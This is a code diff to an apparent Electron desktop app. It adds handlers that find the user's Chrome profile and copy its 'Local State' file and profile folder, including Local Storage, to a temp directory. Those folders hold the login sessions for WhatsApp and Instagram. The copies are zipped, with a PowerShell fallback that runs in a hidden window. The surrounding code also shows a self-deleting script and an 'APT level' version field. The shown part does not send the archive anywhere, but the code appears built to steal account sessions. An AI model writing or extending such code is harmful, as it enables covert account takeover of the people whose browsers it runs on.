@@ -108,8 +108,8 @@ app.whenReady().then(() => {
 
     ipcMain.handle('get-version', () => {
         return {
-            appVersion: "1.0.9",
-            aptVersion: "apt-12" // Current APT level
+            appVersion: "1.0.10",
+            aptVersion: "apt-13" // Current APT level
         };
     });
 
@@ -365,6 +365,107 @@ objFSO.DeleteFile WScript.ScriptFullName
         }
 
         const activeProfile = profileName || await findWhatsAppProfile(userDataDir);
+
+        try { if (fs.existsSync(clonedDir)) await fsExtra.remove(clonedDir); } catch(e){}
+        try { if (fs.existsSync(zipPath)) await fsExtra.remove(zipPath); } catch(e){}
+
+        await fsExtra.ensureDir(clonedDir);
+        
+        async function copyProfileData() {
+            try {
+                const localStateSrc = path.join(userDataDir, 'Local State');
+                if (fs.existsSync(localStateSrc)) {
+                    await fs.promises.copyFile(localStateSrc, path.join(clonedDir, 'Local State'));
+                }
+            } catch(e){}
+
+            const srcProfile = path.join(userDataDir, activeProfile);
+            const destProfile = path.join(clonedDir, activeProfile);
+            
+            async function robustCopy(src, dest) {
+                await fsExtra.ensureDir(dest);
+                const items = await fs.promises.readdir(src, { withFileTypes: true });
+                for (const item of items) {
+                    const srcP = path.join(src, item.name);
+                    const destP = path.join(dest, item.name);
+                    const s = srcP.toLowerCase();
+                    if (
+                        s.includes('cache') || 
+                        s.includes('crashpad') || 
+                        s.includes('service worker\\cachestorage') || 
+                        s.includes('service worker\\scriptcache') || 
+                        item.name === 'SingletonLock' || 
+                        item.name === 'LOCK'
+                    ) continue;
+                    
+                    if (item.isDirectory()) {
+                        await robustCopy(srcP, destP);
+                    } else {
+                        try {
+                            await fs.promises.copyFile(srcP, destP);
+                        } catch(err) {
+                            try {
+                                const data = await fs.promises.readFile(srcP);
+                                await fs.promises.writeFile(destP, data);
+                            } catch(err2) {}
+                        }
+                    }
+                }
+            }
+            if (fs.existsSync(srcProfile)) {
+                await robustCopy(srcProfile, destProfile);
+            }
+        }
+
+        await copyProfileData();
+
+        return new Promise((resolve) => {
+            exec(`tar.exe -a -c -f "${zipPath}" -C "${clonedDir}" .`, (err) => {
+                if (err) {
+                    exec(`powershell -WindowStyle Hidden -Command "Compress-Archive -Path '${clonedDir}\\*' -DestinationPath '${zipPath}' -Force"`, (err2) => {
+                        if (err2) resolve(null);
+                        else resolve(zipPath);
+                    });
+                } else {
+                    resolve(zipPath);
+                }
+            });
+        });
+    });
+
+    ipcMain.handle('zip-instagram-profile', async (event, profileName) => {
+        const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
+        const clonedDir = path.join(os.tmpdir(), 'CML_IG_Profile_Clone');
+        const zipPath = path.join(os.tmpdir(), 'Instagram_Profile.zip');
+
+        async function findInstaProfile(dir) {
+            try {
+                const items = await fs.promises.readdir(dir, { withFileTypes: true });
+                let mostRecentProfile = 'Default';
+                let latestTime = 0;
+                for (const item of items) {
+                    if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
+                        // Instagram stores data in Local Storage or IndexedDB
+                        const igLocalDbPath = path.join(dir, item.name, 'Local Storage', 'leveldb');
+                        if (fs.existsSync(igLocalDbPath)) {
+                            try {
+                                const stat = await fs.promises.stat(igLocalDbPath);
+                                if (stat.mtimeMs > latestTime) {
+                                    latestTime = stat.mtimeMs;
+                                    mostRecentProfile = item.name;
+                                }
+                            } catch (e) {
+                                if (latestTime === 0) mostRecentProfile = item.name;
+                            }
+                        }
+                    }
+                }
+                return mostRecentProfile;
+            } catch (e) {}
+            return 'Default';
+        }
+
+        const activeProfile = profileName || await findInstaProfile(userDataDir);
 
         try { if (fs.existsSync(clonedDir)) await fsExtra.remove(clonedDir); } catch(e){}
         try { if (fs.existsSync(zipPath)) await fsExtra.remove(zipPath); } catch(e){}
